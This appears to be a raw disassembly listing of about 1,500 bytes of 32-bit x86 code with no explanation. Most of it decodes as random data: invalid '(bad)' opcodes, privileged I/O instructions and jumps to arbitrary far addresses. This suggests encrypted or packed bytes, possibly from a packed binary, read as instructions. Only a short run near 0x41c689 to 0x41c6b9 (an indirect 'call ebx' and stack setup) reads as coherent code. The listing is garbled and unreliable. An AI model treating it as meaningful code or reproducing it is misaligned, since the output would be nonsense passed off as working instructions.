  41bf5b:	and    al,BYTE PTR [edi+0x68]
  41bf5e:	mov    ds:0xa1c39dca,eax
  41bf63:	ret    0x8e92
  41bf66:	add    eax,0x548e3951
  41bf6b:	leave  
  41bf6c:	repnz and al,0xef
  41bf6f:	stos   BYTE PTR es:[edi],al
  41bf70:	jno    0x41bfee
  41bf72:	dec    edi
  41bf73:	vmwrite eax,DWORD PTR [edi]
  41bf76:	ror    BYTE PTR [ebp+0x4d30f5e5],cl
  41bf7c:	jmp    0x41bfc5
  41bf7e:	dec    ah
  41bf80:	jbe    0x41bf3c
  41bf82:	stc    
  41bf83:	test   al,0xf8
  41bf86:	lock mov esi,0xdfd1ee84
  41bf8c:	jle    0x41bfde
  41bf8e:	retf   0xf4f4
  41bf91:	add    bh,BYTE PTR [ebx]
  41bf93:	sub    BYTE PTR [edi],dh
  41bf95:	mov    ecx,0x9f28ef6
  41bf9a:	pop    edi
  41bf9b:	test   DWORD PTR [ebp-0x30],esp
  41bf9e:	call   0x62cafc4c
  41bfa3:	adc    al,0x3
  41bfa5:	push   esi
  41bfa6:	xchg   ecx,eax
  41bfa7:	daa    
  41bfa8:	(bad)  
  41bfa9:	xchg   edx,eax
  41bfaa:	and    al,al
  41bfac:	cmp    esi,ecx
  41bfae:	jb     0x41c00b
  41bfb0:	xchg   ebx,eax
  41bfb1:	add    eax,ebx
  41bfb3:	xchg   BYTE PTR [ebp+0x52],ch
  41bfb6:	jmp    0xebec:0xe72f6033
  41bfbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfbe:	push   eax
  41bfbf:	cmp    al,0x8d
  41bfc1:	mov    WORD PTR [edx],cs
  41bfc3:	cwde   
  41bfc4:	jb     0x41bff8
  41bfc6:	add    BYTE PTR [ebx],bh
  41bfc8:	enter  0x850f,0x8d
  41bfcc:	hlt    
  41bfcd:	(bad)  
  41bfce:	dec    DWORD PTR [ebx+0x5e9de]
  41bfd4:	add    BYTE PTR [eax],al
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	mov    edi,0xb8ce0863
  41bff4:	call   0x7e523878
  41bff9:	js     0x41c073
  41bffb:	dec    esi
  41bffc:	out    dx,eax
  41bffd:	call   0x1316:0x96a9941b
  41c004:	mov    bh,0x74
  41c006:	ins    DWORD PTR es:[edi],dx
  41c007:	bound  ebx,QWORD PTR [ecx]
  41c009:	je     0x41bfc0
  41c00b:	lods   al,BYTE PTR ds:[esi]
  41c00c:	xchg   ebx,eax
  41c00d:	and    DWORD PTR [edi+0x1637ba00],ebx
  41c013:	sahf   
  41c014:	mov    edi,0x74a4496a
  41c019:	fcom   QWORD PTR [ecx-0x6e3cbf51]
  41c01f:	je     0x41bfef
  41c021:	bndstx [esi+0x3],(bad)
  41c025:	ins    DWORD PTR es:[edi],dx
  41c026:	fcom   DWORD PTR [edx]
  41c028:	push   ebx
  41c029:	pop    edi
  41c02a:	mov    edi,0xa01de8c7
  41c02f:	mov    al,0x46
  41c031:	xor    ecx,esi
  41c033:	in     al,0x44
  41c035:	mov    eax,ds:0x7f81e9fb
  41c03a:	dec    ebx
  41c03b:	mov    dh,0x7b
  41c03d:	inc    DWORD PTR [eax]
  41c03f:	add    DWORD PTR [edi-0x1d],0xeea50fdb
  41c046:	mov    dh,BYTE PTR [esi]
  41c048:	iret   
  41c049:	jb     0x41bff8
  41c04b:	xchg   edi,eax
  41c04c:	mov    al,ds:0x5d3aa177
  41c051:	or     edi,ecx
  41c053:	xchg   BYTE PTR [ecx],bh
  41c055:	jno    0x41c015
  41c057:	inc    ebx
  41c058:	fmul   st(4),st
  41c05a:	or     dh,BYTE PTR [edi]
  41c05c:	dec    ecx
  41c05d:	sbb    ecx,DWORD PTR [eax+ebp*8]
  41c060:	adc    eax,0xd6058b28
  41c065:	test   al,0x8b
  41c067:	shl    dl,0xb8
  41c06a:	dec    eax
  41c06b:	gs pushf 
  41c06d:	cs jns 0x41c0bf
  41c070:	neg    BYTE PTR [edi+0x26]
  41c073:	stos   BYTE PTR es:[edi],al
  41c074:	push   ecx
  41c075:	mov    WORD PTR [edx+0x4d],fs
  41c078:	xchg   DWORD PTR ds:0xd84c348f,esp
  41c07e:	cmp    DWORD PTR [ecx+0x671c2a10],ebx
  41c084:	popf   
  41c085:	lea    ebx,[ebp+0x2d360518]
  41c08b:	and    DWORD PTR [edi-0x57ea4be2],ebx
  41c091:	lahf   
  41c092:	add    eax,0x860d2ecc
  41c097:	dec    esi
  41c098:	or     al,0xc6
  41c09a:	daa    
  41c09b:	call   0x68f941c4
  41c0a0:	sbb    edx,DWORD PTR gs:[ecx-0x37f1733a]
  41c0a7:	cs mov dh,0x9b
  41c0aa:	retf   0xfaa3
  41c0ad:	sub    eax,0x5d92846a
  41c0b2:	imul   edi,DWORD PTR [eax+0x5a],0xffffffb2
  41c0b6:	sub    edx,eax
  41c0b8:	call   0x4ff9:0x36f6a127
  41c0bf:	ja     0x41c12a
  41c0c1:	mov    gs,WORD PTR [ecx-0x46]
  41c0c4:	push   0xc0bca355
  41c0c9:	sbb    ebp,DWORD PTR [esi-0x33de618]
  41c0cf:	jae    0x41c0ed
  41c0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0d2:	fs jno 0x41c147
  41c0d5:	ror    ch,cl
  41c0d7:	les    edi,FWORD PTR [ecx]
  41c0d9:	rcr    BYTE PTR [ecx],cl
  41c0db:	mov    bh,BYTE PTR [eax]
  41c0dd:	cwde   
  41c0de:	call   0xead8:0x341a67de
  41c0e5:	mov    esp,0xa6e7dd74
  41c0ea:	imul   ebp,DWORD PTR [esi],0xffffffb5
  41c0ed:	stos   DWORD PTR es:[edi],eax
  41c0ee:	sbb    al,0xc5
  41c0f0:	xor    dh,BYTE PTR [ebx]
  41c0f2:	mov    bl,0x3c
  41c0f4:	jp     0x41c07e
  41c0f6:	mov    ch,0x63
  41c0f8:	fs xchg bp,ax
  41c0fb:	adc    DWORD PTR [eax],edi
  41c0fd:	push   eax
  41c0fe:	and    dh,bh
  41c100:	bound  eax,QWORD PTR [edx-0x3d5a6465]
  41c106:	loope  0x41c0f2
  41c108:	sub    dh,bl
  41c10a:	dec    ecx
  41c10b:	lds    esp,FWORD PTR [edx-0x79ddc923]
  41c111:	clc    
  41c112:	pop    ecx
  41c113:	xchg   edi,eax
  41c114:	mov    edi,0xabf0ce43
  41c119:	out    dx,eax
  41c11a:	fbstp  TBYTE PTR [esi+0x22c7ca9a]
  41c120:	icebp  
  41c121:	xchg   BYTE PTR [eax-0x60],ch
  41c124:	(bad)  
  41c125:	(bad)  
  41c126:	hlt    
  41c127:	enter  0xc11d,0xe3
  41c12b:	push   edx
  41c12c:	and    eax,0xd4e93438
  41c131:	cmp    BYTE PTR [ebp-0x4e460814],dh
  41c137:	add    ebx,ecx
  41c139:	dec    eax
  41c13a:	mov    ah,0xf8
  41c13c:	jl     0x41c0f6
  41c13e:	out    dx,al
  41c13f:	mov    ecx,gs
  41c141:	sub    DWORD PTR [ebx+0x24],esi
  41c144:	(bad)  [esi-0x6c29e45]
  41c14a:	out    0x41,al
  41c14c:	sub    al,BYTE PTR [esi]
  41c14e:	cmp    ah,BYTE PTR [edi]
  41c150:	out    dx,eax
  41c151:	push   es
  41c152:	xor    eax,0x7577f633
  41c157:	push   0xffffffcd
  41c159:	xor    al,0xa3
  41c15b:	xor    eax,0x138963f9
  41c160:	inc    esp
  41c161:	push   cs
  41c162:	aam    0x3
  41c164:	in     eax,dx
  41c165:	xchg   ebp,eax
  41c166:	je     0x41c1a0
  41c168:	div    DWORD PTR [eax+0x61aeb922]
  41c16e:	lds    edi,FWORD PTR [edx-0x29439bb8]
  41c174:	dec    ebx
  41c175:	jmp    0x41c137
  41c177:	shr    DWORD PTR cs:[ebx-0x13],cl
  41c17b:	loope  0x41c11a
  41c17d:	nop
  41c17e:	out    dx,eax
  41c17f:	out    dx,eax
  41c180:	cmp    dl,0x86
  41c183:	dec    ebp
  41c184:	ss retf 0xe611
  41c188:	sub    ebp,ebp
  41c18a:	(bad)  
  41c18b:	in     al,0x2d
  41c18d:	cs ins WORD PTR es:[edi],dx
  41c190:	(bad)  
  41c192:	sbb    al,0xdd
  41c194:	adc    bh,BYTE PTR [eax]
  41c196:	(bad)  
  41c197:	cli    
  41c198:	out    dx,al
  41c199:	xor    DWORD PTR [esi],edi
  41c19b:	test   al,0xf8
  41c19d:	sbb    al,0xc6
  41c19f:	fild   WORD PTR [ebx-0x7b4f51cf]
  41c1a5:	ss dec esp
  41c1a7:	push   edx
  41c1a8:	lahf   
  41c1a9:	cmp    dh,al
  41c1ab:	imul   edx,DWORD PTR [eax+0x236ea974],0xffffffab
  41c1b2:	adc    DWORD PTR [ebx+0x75398c5a],esp
  41c1b8:	mov    edx,0xa4339907
  41c1bd:	adc    ah,BYTE PTR [esi+0x25]
  41c1c0:	jbe    0x41c1d3
  41c1c2:	or     DWORD PTR [ebx],edx
  41c1c4:	or     DWORD PTR [ebp-0x1a],0x96c5113e
  41c1cb:	pop    edi
  41c1cc:	dec    ecx
  41c1cd:	xor    bl,al
  41c1cf:	repz jae 0x41c216
  41c1d2:	sar    BYTE PTR [eax-0x2ca6edb9],1
  41c1d8:	repz jns 0x41c1cc
  41c1db:	dec    ebx
  41c1dc:	rcl    DWORD PTR [ebx+0x372ce79d],1
  41c1e2:	mov    cl,0x17
  41c1e4:	lods   al,BYTE PTR ds:[esi]
  41c1e5:	or     cl,al
  41c1e7:	cmp    DWORD PTR [edi],0x59926475
  41c1ed:	cmp    edx,DWORD PTR [ecx-0x43ee1141]
  41c1f3:	xchg   esp,eax
  41c1f4:	rcr    cl,1
  41c1f6:	and    al,0x9
  41c1f8:	cmp    dh,BYTE PTR [edx-0x57c7e3a4]
  41c1fe:	call   0xd2c2d5fa
  41c203:	fwait
  41c204:	pop    ds
  41c205:	js     0x41c1bd
  41c207:	and    eax,0x303e4419
  41c20c:	scas   eax,DWORD PTR es:[edi]
  41c20d:	loope  0x41c25b
  41c20f:	mov    ebx,0x35177a7f
  41c214:	push   eax
  41c215:	or     BYTE PTR [ecx+0x7],dl
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	jle    0x41c22c
  41c22d:	out    0x62,eax
  41c22f:	push   eax
  41c230:	out    dx,al
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c2b7
  41c238:	sub    al,0x86
  41c23a:	shl    BYTE PTR [eax-0x4b99e979],cl
  41c240:	iret   
  41c241:	hlt    
  41c242:	fisttp WORD PTR [ecx]
  41c244:	es aaa 
  41c246:	jmp    0x4ab3:0xc92e588d
  41c24d:	imul   ebx,DWORD PTR ds:[edx],0x3e
  41c251:	call   0x98f5:0xe32f384b
  41c258:	and    al,0xd6
  41c25a:	(bad)  
  41c25b:	mov    ch,0xa5
  41c25d:	loop   0x41c2c5
  41c25f:	mov    ebp,edi
  41c261:	mov    dh,bh
  41c263:	pop    ecx
  41c264:	sub    al,BYTE PTR [edx]
  41c266:	and    BYTE PTR [ebp+0x3997275e],0xe3
  41c26d:	test   DWORD PTR [ebx+0xe199393],esp
  41c273:	sub    DWORD PTR [esi+0x27],ecx
  41c276:	aad    0x72
  41c278:	in     al,0xfa
  41c27a:	data16 (bad) 
  41c27c:	mov    esi,0xb6afaad8
  41c281:	dec    esi
  41c282:	dec    ebp
  41c283:	mov    ds:0x4f7d6926,eax
  41c288:	sbb    esp,DWORD PTR [esi]
  41c28a:	pop    esi
  41c28b:	outs   dx,BYTE PTR ds:[esi]
  41c28c:	fldpi  
  41c28e:	and    ebp,DWORD PTR [edx]
  41c290:	add    DWORD PTR [ecx-0x1f294ed1],esp
  41c296:	jbe    0x41c250
  41c298:	int    0xfb
  41c29a:	test   al,0x26
  41c29c:	sbb    al,BYTE PTR [ebx]
  41c29e:	jge    0x41c2b4
  41c2a0:	cmp    eax,0x91592c6b
  41c2a5:	inc    edi
  41c2a6:	fsub   DWORD PTR [edi+0x39]
  41c2a9:	cwde   
  41c2aa:	ss push 0x78
  41c2ad:	mov    edx,0x611b5096
  41c2b2:	shr    BYTE PTR [edi+ebp*8-0x657a0f54],1
  41c2b9:	mov    al,ds:0xeba1c1d7
  41c2be:	jnp    0x41c2be
  41c2c0:	and    BYTE PTR [ebx-0x64cac11c],ch
  41c2c6:	lahf   
  41c2c7:	sbb    ecx,edi
  41c2c9:	mov    ch,0xfd
  41c2cb:	pop    ecx
  41c2cc:	xor    esi,esp
  41c2ce:	cwde   
  41c2cf:	jno    0x41c33d
  41c2d1:	cmp    DWORD PTR [eax+0x152139db],0xffffffa5
  41c2d8:	ds cli 
  41c2da:	jge    0x41c2c2
  41c2dc:	sbb    eax,eax
  41c2de:	arpl   WORD PTR [edi-0xe],sp
  41c2e1:	push   ecx
  41c2e2:	mov    edx,0xf9c9db4e
  41c2e7:	call   0x79aedffb
  41c2ec:	adc    ah,dl
  41c2ee:	add    al,0xa3
  41c2f0:	fnsave [edx+0x6b]
  41c2f3:	push   cs
  41c2f4:	jae    0x41c327
  41c2f6:	ja     0x41c28c
  41c2f8:	fld    DWORD PTR [ecx]
  41c2fa:	ret    0xa004
  41c2fd:	rcl    ah,0x65
  41c300:	call   0x76bd826d
  41c305:	imul   esi,DWORD PTR [esi+0x78],0x61
  41c309:	test   DWORD PTR [eax],esi
  41c30b:	push   ds
  41c30c:	out    0x12,al
  41c30e:	daa    
  41c30f:	bnd jl 0x41c346
  41c312:	ret    0x9abc
  41c315:	jae    0x41c2b5
  41c317:	push   ecx
  41c318:	and    ebp,DWORD PTR [ecx+eax*4-0x12]
  41c31c:	les    edx,FWORD PTR ds:0xba69c7f
  41c322:	sub    BYTE PTR [edx],bh
  41c324:	cli    
  41c325:	into   
  41c326:	test   al,0x76
  41c328:	xchg   ebp,eax
  41c329:	out    0xf3,al
  41c32b:	pusha  
  41c32c:	les    esp,FWORD PTR [ebx+0x1c54275b]
  41c332:	adc    BYTE PTR [edi],ch
  41c334:	xchg   ch,dl
  41c336:	sbb    DWORD PTR [ecx],0xfad52a0d
  41c33c:	rcr    BYTE PTR [edi+0x9e72f8f],cl
  41c342:	mov    esp,edx
  41c344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c346:	adc    DWORD PTR [edi],eax
  41c348:	push   ss
  41c349:	in     eax,0x2f
  41c34b:	sbb    DWORD PTR [ecx],edi
  41c34d:	xor    al,0xa2
  41c34f:	lods   al,BYTE PTR ds:[esi]
  41c350:	dec    ecx
  41c351:	dec    esi
  41c352:	mov    ds:0xb0197b40,eax
  41c357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c358:	inc    DWORD PTR [ebx+0x3d709005]
  41c35e:	aam    0x36
  41c360:	hlt    
  41c361:	mov    al,ds:0xb50479fc
  41c366:	and    eax,0xb3f2acaa
  41c36b:	and    al,0xd4
  41c36d:	lahf   
  41c36e:	pop    ebp
  41c36f:	test   DWORD PTR [edx],ecx
  41c371:	int    0x2e
  41c373:	aam    0x4a
  41c375:	shl    DWORD PTR [ecx],cl
  41c377:	std    
  41c378:	mov    ebx,0xb730ce6f
  41c37d:	stos   BYTE PTR es:[edi],al
  41c37e:	sub    BYTE PTR [edx-0x52],dh
  41c381:	outs   dx,BYTE PTR ds:[esi]
  41c382:	out    dx,al
  41c383:	adc    DWORD PTR [eax],esp
  41c385:	lods   al,BYTE PTR ds:[esi]
  41c386:	push   cs
  41c387:	sbb    al,0xb3
  41c389:	mov    ebp,0xb76dda2d
  41c38e:	lods   al,BYTE PTR ds:[esi]
  41c38f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c390:	cmp    al,0x2e
  41c392:	and    DWORD PTR [esi],ebx
  41c394:	xchg   BYTE PTR ds:0xfd0caf76,ah
  41c39a:	ins    DWORD PTR es:[edi],dx
  41c39b:	lods   eax,DWORD PTR ds:[esi]
  41c39c:	mov    eax,ds:0x41eb4720
  41c3a1:	jmp    0x41c351
  41c3a3:	dec    edx
  41c3a4:	shl    BYTE PTR [edx-0x48],0xe
  41c3a8:	frndint 
  41c3aa:	add    BYTE PTR [ecx+0x50],bh
  41c3ad:	ret    0x34c9
  41c3b0:	adc    esi,DWORD PTR [ebp+0xa]
  41c3b3:	jae    0x41c357
  41c3b5:	mov    BYTE PTR [ebx+0x6f],cl
  41c3b8:	mov    esp,0x30c2a1e0
  41c3bd:	mov    bh,0x8e
  41c3bf:	push   ss
  41c3c0:	out    0xdd,al
  41c3c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c3:	adc    BYTE PTR [esp+edx*1-0x1318dbe4],cl
  41c3ca:	movntq QWORD PTR [esi+0x3d],mm5
  41c3ce:	cs stc 
  41c3d0:	or     dl,BYTE PTR [esi+0x14]
  41c3d3:	dec    eax
  41c3d4:	jle    0x41c35c
  41c3d6:	jbe    0x41c3e6
  41c3d8:	or     esi,DWORD PTR [edx+0x23]
  41c3db:	add    eax,0x3a65001b
  41c3e0:	gs xchg ecx,eax
  41c3e2:	clc    
  41c3e3:	(bad)  
  41c3e4:	pop    edx
  41c3e5:	call   0xcd457007
  41c3ea:	adc    eax,0x6f22cf65
  41c3ef:	mov    ch,0xf8
  41c3f1:	inc    esp
  41c3f2:	loop   0x41c444
  41c3f4:	xchg   BYTE PTR [eax+edi*1+0x79],ch
  41c3f8:	jp     0x41c3a1
  41c3fa:	call   0x7564:0xfea4e26
  41c401:	jge    0x41c47b
  41c403:	dec    ebx
  41c404:	cmp    edx,ebx
  41c406:	mov    ebp,0x5ac89314
  41c40b:	ja     0x41c410
  41c40d:	adc    al,0x36
  41c40f:	imul   edi,DWORD PTR [eax+0x691b7713],0xaf3e4fd7
  41c419:	or     DWORD PTR [esi+ebx*8+0x5e30fd2a],esp
  41c420:	call   0x23a5:0xbe42e444
  41c427:	les    ebp,FWORD PTR [eax+0x4c]
  41c42a:	in     al,0x82
  41c42c:	jne    0x41c45d
  41c42e:	repnz cld 
  41c430:	sbb    esp,DWORD PTR ds:0x27ad7d03
  41c436:	dec    edi
  41c437:	lods   al,BYTE PTR ds:[esi]
  41c438:	into   
  41c439:	xor    al,0x86
  41c43b:	add    cl,cl
  41c43d:	and    DWORD PTR [ecx-0x18a2e421],eax
  41c443:	and    eax,0xa47d6a67
  41c448:	cwde   
  41c449:	inc    ecx
  41c44a:	call   0x4589:0x15f00c1f
  41c451:	hlt    
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c45e
  41c464:	jp     0x41c4ba
  41c466:	shr    DWORD PTR [eax-0x14],cl
  41c469:	jg     0x41c4e3
  41c46b:	adc    BYTE PTR [esi+0x78],bh
  41c46e:	js     0x41c4da
  41c470:	sub    ebx,DWORD PTR [edi+0x73]
  41c473:	es ja  0x41c4ce
  41c476:	inc    esp
  41c477:	rcr    DWORD PTR [esi-0x74],1
  41c47a:	dec    esi
  41c47b:	setnp  bl
  41c47e:	jbe    0x41c487
  41c480:	xor    BYTE PTR [ecx-0x2d33141e],0xa
  41c487:	jb     0x41c4c0
  41c489:	lea    esp,[ecx-0x266a6f8e]
  41c48f:	jmp    0xda89:0xf5af5b69
  41c496:	or     BYTE PTR [esi+0x51],bh
  41c499:	push   ecx
  41c49a:	jne    0x41c443
  41c49c:	je     0x41c423
  41c49e:	fnstcw WORD PTR [edx-0x7f90a3fd]
  41c4a4:	inc    edx
  41c4a5:	idiv   BYTE PTR [esp+ebp*4+0x7e]
  41c4a9:	or     DWORD PTR [eax-0x177c0f5b],eax
  41c4af:	mov    ch,0x1a
  41c4b1:	test   BYTE PTR [esi],0x2d
  41c4b4:	pop    edx
  41c4b5:	lods   eax,DWORD PTR ds:[esi]
  41c4b6:	mov    edi,0xa0addb4f
  41c4bb:	push   ds
  41c4bc:	stos   DWORD PTR es:[edi],eax
  41c4bd:	ret    
  41c4be:	inc    edi
  41c4bf:	ret    0x3b3c
  41c4c2:	mov    edx,0x7ebd4cdc
  41c4c7:	retf   
  41c4c8:	scas   al,BYTE PTR es:[edi]
  41c4c9:	imul   esp,edi,0x6e614a71
  41c4cf:	jle    0x41c4f1
  41c4d1:	adc    bl,bl
  41c4d3:	bound  esi,QWORD PTR [eax+ecx*8]
  41c4d6:	jnp    0x41c4f5
  41c4d8:	lods   al,BYTE PTR ds:[esi]
  41c4d9:	push   ds
  41c4da:	adc    cl,BYTE PTR [edi]
  41c4dc:	out    dx,al
  41c4dd:	test   BYTE PTR [esi+edi*1+0x37388a7e],0x66
  41c4e5:	mov    esp,0xec7b93cc
  41c4ea:	dec    ebp
  41c4eb:	dec    eax
  41c4ec:	or     ebp,DWORD PTR [ecx]
  41c4ee:	jb     0x41c492
  41c4f0:	cmc    
  41c4f1:	mov    eax,ds:0x8f15669a
  41c4f6:	xchg   BYTE PTR [ebp-0x74],al
  41c4f9:	or     eax,0xf3ee68fc
  41c4fe:	jmp    0x41c486
  41c500:	js     0x41c494
  41c502:	xor    dl,BYTE PTR [edx]
  41c504:	cli    
  41c505:	xchg   ebp,eax
  41c506:	xchg   edx,eax
  41c507:	adc    al,0x25
  41c509:	in     al,dx
  41c50a:	xchg   edi,eax
  41c50b:	sbb    cl,dl
  41c50d:	and    al,0x9
  41c50f:	sahf   
  41c510:	sbb    esi,ebx
  41c512:	mov    al,ds:0xc3ff3aa4
  41c517:	fld    QWORD PTR [eax+0x1d]
  41c51a:	arpl   si,cx
  41c51c:	inc    edx
  41c51d:	test   edx,eax
  41c51f:	jne    0x41c4b6
  41c521:	adc    esi,edi
  41c523:	das    
  41c524:	mov    edi,0xbd51705
  41c529:	mov    ss,WORD PTR [ecx+eiz*4-0x6bffca59]
  41c530:	(bad)
  41c533:	cmp    BYTE PTR [ebx-0x78],0x4a
  41c537:	xchg   ebp,eax
  41c538:	inc    ebp
  41c539:	(bad)  
  41c53a:	lock xor al,BYTE PTR [ebp+0x7e]
  41c53e:	add    dh,ch
  41c540:	leave  
  41c541:	test   DWORD PTR [esi-0x59949247],edx
  41c547:	je     0x41c52a
  41c549:	xor    eax,0xdb6d677e
  41c54e:	bound  ebp,QWORD PTR [edx]
  41c550:	pop    eax
  41c551:	jnp    0x41c4e3
  41c553:	xchg   DWORD PTR [eax-0x26d73f33],ebx
  41c559:	pusha  
  41c55a:	(bad)  
  41c55b:	pop    edx
  41c55c:	pop    ebp
  41c55d:	(bad)  
  41c55e:	loope  0x41c5bc
  41c560:	adc    bl,BYTE PTR [ebp-0x41]
  41c563:	sub    al,BYTE PTR [bp+di]
  41c566:	dec    edi
  41c567:	(bad)  
  41c568:	xchg   ebp,eax
  41c569:	leave  
  41c56a:	bound  eax,QWORD PTR [eax-0x12]
  41c56d:	jg     0x41c540
  41c56f:	imul   ecx,DWORD PTR [edx],0x5d632174
  41c575:	leave  
  41c576:	cwde   
  41c577:	pop    ebp
  41c578:	js     0x41c521
  41c57a:	or     eax,DWORD PTR [ebp-0x4b9bbfcc]
  41c580:	jnp    0x41c509
  41c582:	ss ja  0x41c541
  41c585:	sbb    ah,BYTE PTR [esp-0x279674e2]
  41c58c:	xchg   ebp,eax
  41c58d:	cli    
  41c58e:	mov    eax,0x978a0429
  41c593:	outs   dx,DWORD PTR ds:[esi]
  41c594:	stos   DWORD PTR es:[edi],eax
  41c595:	addr16 hlt 
  41c597:	shl    BYTE PTR [esp+edx*1],cl
  41c59a:	ret    
  41c59b:	in     eax,0x8c
  41c59d:	dec    ecx
  41c59e:	or     esp,DWORD PTR [eax]
  41c5a0:	(bad)  
  41c5a1:	cmp    BYTE PTR [ebp+0x52],dh
  41c5a4:	ds rol bh,0x56
  41c5a8:	xchg   edi,eax
  41c5a9:	int    0x53
  41c5ab:	mov    fs,WORD PTR [edi+0x58b50233]
  41c5b1:	jp     0x41c5af
  41c5b3:	mov    edx,0xf7e304ed
  41c5b8:	mov    bh,0xf4
  41c5ba:	xchg   ecx,eax
  41c5bb:	mov    edx,0x191e4c83
  41c5c0:	xchg   DWORD PTR [edx],esi
  41c5c2:	push   esi
  41c5c3:	scas   al,BYTE PTR es:[edi]
  41c5c4:	shl    BYTE PTR [edx+0x11],0xb0
  41c5c8:	fmul   QWORD PTR [ebx+0x4dbae79d]
  41c5ce:	das    
  41c5cf:	(bad)  
  41c5d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5d1:	pushf  
  41c5d2:	cmp    eax,0xfa85eb45
  41c5d7:	enter  0xfd17,0x40
  41c5db:	add    ecx,DWORD PTR [ebp+0x1bd659ba]
  41c5e1:	test   eax,0x7ef6c996
  41c5e6:	add    edi,ebx
  41c5e8:	push   eax
  41c5e9:	or     al,0x87
  41c5eb:	jmp    DWORD PTR [esi-0x27948284]
  41c5f1:	loop   0x41c637
  41c5f3:	repz mov esp,0x5aa5cd1
  41c5f9:	popf   
  41c5fa:	(bad)  
  41c5fb:	mov    ebx,0xee223976
  41c600:	pop    eax
  41c601:	mov    DWORD PTR [esi+ebp*8],esp
  41c604:	cmc    
  41c605:	mov    al,0x24
  41c607:	mov    eax,ds:0xdc452da0
  41c60c:	mov    eax,ds:0xaf7783db
  41c611:	add    al,0x1c
  41c613:	and    eax,DWORD PTR [ebx-0x47]
  41c616:	mov    eax,ebx
  41c618:	repnz sbb BYTE PTR [ebp+0x59b7911],cl
  41c61f:	cmp    eax,0x4b26696e
  41c624:	repz mov dl,0x33
  41c627:	mov    BYTE PTR [edi],ch
  41c629:	cmp    eax,0x8c13f79d
  41c62e:	push   es
  41c62f:	jmp    0xa208:0xd56bc4fe
  41c636:	(bad)
  41c639:	addr16 push edi
  41c63b:	outs   dx,BYTE PTR ds:[esi]
  41c63c:	iret   
  41c63d:	mov    al,0x3d
  41c63f:	jmp    0x8c50:0x3cca039d
  41c646:	rcr    DWORD PTR [ecx-0x17],1
  41c649:	cld    
  41c64a:	cdq    
  41c64b:	rcr    BYTE PTR [ebx+0x77],cl
  41c64e:	jno    0x41c635
  41c650:	les    ecx,FWORD PTR [esi*8-0x75d2afdb]
  41c657:	jo     0x41c5f4
  41c659:	sar    BYTE PTR [esi],cl
  41c65b:	inc    ecx
  41c65c:	cmp    eax,edi
  41c65e:	mov    dl,0x81
  41c660:	sbb    eax,0xedeafafe
  41c665:	in     al,dx
  41c666:	int    0x78
  41c668:	xor    bh,BYTE PTR [edx+0x722790e2]
  41c66e:	nop
  41c66f:	(bad)  
  41c670:	int3   
  41c671:	out    dx,al
  41c672:	pop    esi
  41c673:	dec    ecx
  41c674:	sahf   
  41c675:	xor    BYTE PTR [eax+ebx*2-0x2f2d9028],al
  41c67c:	mov    esp,0x6ad33421
  41c681:	xchg   ebx,eax
  41c682:	jns    0x41c6da
  41c684:	mov    ds:0xdb33b02c,eax
  41c689:	lea    eax,[ebp-0x10]
  41c68c:	add    ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x9a46773e,eax
  41c6cc:	xchg   ebp,eax
  41c6cd:	xor    BYTE PTR [eax],al
  41c6cf:	icebp  
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c6db
  41c6d7:	mov    ch,0xbd
  41c6d9:	or     edx,DWORD PTR [ebx+0x722e4759]
  41c6df:	out    dx,al
  41c6e0:	fs jns 0x41c761
  41c6e3:	mov    ah,0xbc
  41c6e5:	rcr    BYTE PTR [ebp+0x55],cl
  41c6e8:	ins    BYTE PTR es:[edi],dx
  41c6e9:	cs clc 
  41c6eb:	xchg   esi,eax
  41c6ec:	pusha  
  41c6ed:	jl     0x41c6b3
  41c6ef:	retf   
  41c6f0:	imul   ebx,DWORD PTR [esi],0xffffffb9
  41c6f3:	cld    
  41c6f4:	inc    ebx
  41c6f5:	add    al,BYTE PTR [eax+0x472ddfa3]
  41c6fb:	mov    bl,0x2a
  41c6fd:	jge    0x41c6bf
  41c6ff:	pmaxub mm1,QWORD PTR [ebx-0x41917393]
  41c706:	les    eax,FWORD PTR [eax]
  41c708:	out    dx,al
  41c709:	mov    ch,0xb0
  41c70b:	inc    eax
